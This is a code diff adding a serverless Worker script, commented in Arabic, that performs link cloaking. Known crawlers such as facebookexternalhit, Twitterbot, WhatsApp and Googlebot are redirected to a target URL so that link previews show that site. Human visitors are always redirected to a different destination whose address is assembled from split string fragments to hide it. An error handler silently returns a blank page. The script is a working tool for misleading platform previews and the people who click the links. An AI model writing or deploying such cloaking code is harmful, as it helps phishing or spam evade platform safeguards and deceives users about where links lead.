@@ -1,0 +1,45 @@
+export default {
+  async fetch(request, env, ctx) {
+    try {
+      let url = new URL(request.url);
+      let pathname = url.pathname.substring(1);
+      
+      try { 
+        pathname = decodeURIComponent(pathname); 
+      } catch(err) {}
+
+      let targetUrl = pathname && !pathname.startsWith("http") ? pathname : pathname || "";
+      let userAgent = request.headers.get("user-agent") || "";
+      
+      // فحص البوتات بدقة لتوجيه المعاينة فوراً
+      let isBot = /facebookexternalhit|Facebot|Twitterbot|Googlebot|LinkedInBot|WhatsApp|Bluesky|MetaInspector/i.test(userAgent);
+
+      // إذا كان بوت ومعه رابط مستهدف، يوجهه فوراً للموقع لتظهر المعاينة
+      if (isBot && targetUrl) {
+        return Response.redirect(targetUrl, 302);
+      }
+
+      // إذا كان زائر بشري (سواء فتح الرابط لوحده أو معاه مسار)، يتم تحويله فوراً بالدالة العشوائية
+      return executeHumanRedirect();
+
+    } catch (err) {
+      // حماية تمنع ظهور أي إيرور وتحافظ على استقرار الوركر
+      return new Response("", { 
+        status: 200, 
+        headers: { "Content-Type": "text/html; charset=utf-8" } 
+      });
+    }
+  }
+};
+
+// ==========================================
+// دالة العشوائية الأصلية في آخر الكود تماماً
+// ==========================================
+async function executeHumanRedirect() {
+  const a = "goog"; 
+  const b = ".le"; 
+  const c = "..com?"; 
+  const d = Math.ceil(Math.random() * 24); 
+  const finalUrl = "https://" + a + b + c + d; 
+  return Response.redirect(finalUrl, 302);
+}
